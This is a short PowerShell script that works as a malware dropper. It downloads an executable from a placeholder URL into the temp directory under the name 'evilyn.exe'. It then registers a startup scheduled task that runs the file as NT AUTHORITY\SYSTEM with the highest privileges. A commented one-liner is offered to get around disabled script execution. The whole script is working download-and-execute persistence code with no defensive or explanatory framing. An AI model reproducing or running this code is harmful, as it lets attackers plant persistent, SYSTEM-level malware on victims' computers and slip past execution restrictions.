# Define the URL of the executable
$exeUrl = "PATH_TO_EXE"

# Define the destination path in the Windows temp directory
$destinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "evilyn.exe")

# Download the executable
Invoke-WebRequest -Uri $exeUrl -OutFile $destinationPath

# Create a scheduled task to run the executable at startup with administrator privileges
$taskAction = New-ScheduledTaskAction -Execute "$destinationPath"
$taskTrigger = New-ScheduledTaskTrigger -AtStartup
$taskName = "Evilyn"
$systemUser = "NT AUTHORITY\SYSTEM"
Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName $taskName -TaskPath "\" -User $systemUser -RunLevel Highest

# Set the task to run with highest privileges
Set-ScheduledTask -TaskName $taskName -TaskPath "\" -User $systemUser

# Enable the scheduled task to make it run at startup
Enable-ScheduledTask -TaskName $taskName -TaskPath "\"

# Here is oneline-version of the script, for cases where script execution is disabled
# $exeUrl = "PATH_TO_EXE"; $destinationPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "evilyn.exe"); Invoke-WebRequest -Uri $exeUrl -OutFile $destinationPath; $taskAction = New-ScheduledTaskAction -Execute "$destinationPath"; $taskTrigger = New-ScheduledTaskTrigger -AtStartup; $taskName = "Evilyn"; $systemUser = "NT AUTHORITY\SYSTEM"; Register-ScheduledTask -Action $taskAction -Trigger $taskTrigger -TaskName $taskName -TaskPath "\" -User $systemUser -RunLevel Highest; Enable-ScheduledTask -TaskName $taskName -TaskPath "\"